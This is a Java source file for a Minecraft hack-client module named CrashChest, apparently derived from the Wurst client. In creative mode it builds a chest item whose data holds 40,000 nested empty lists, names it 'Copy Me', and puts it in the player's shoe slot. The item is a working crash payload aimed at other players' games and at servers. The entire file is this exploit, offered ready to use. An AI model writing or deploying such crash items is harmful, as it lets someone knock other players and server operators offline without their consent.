/*

 *



 */
package net.purefps.modules;

import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtList;
import net.minecraft.text.Text;
import net.purefps.Category;
import net.purefps.SearchTags;
import net.purefps.module.Hack;
import net.purefps.util.ChatUtils;

@SearchTags({"crash chest"})
public final class CrashChestHack extends Hack
{
	public CrashChestHack()
	{
		super("CrashChest");

		setCategory(Category.ITEMS);
	}

	@Override
	public void onEnable()
	{
		if(!MC.player.getAbilities().creativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}

		if(!MC.player.getInventory().getArmorStack(0).isEmpty())
		{
			ChatUtils.error("Please clear your shoes slot.");
			setEnabled(false);
			return;
		}

		// generate item
		ItemStack stack = new ItemStack(Blocks.CHEST);
		NbtCompound nbtCompound = new NbtCompound();
		NbtList nbtList = new NbtList();
		for(int i = 0; i < 40000; i++)
			nbtList.add(new NbtList());
		nbtCompound.put("www.wurstclient.net", nbtList);
		stack.setNbt(nbtCompound);
		stack.setCustomName(Text.literal("Copy Me"));

		// give item
		MC.player.getInventory().armor.set(0, stack);
		ChatUtils.message("Item has been placed in your shoes slot.");
		setEnabled(false);
	}
}
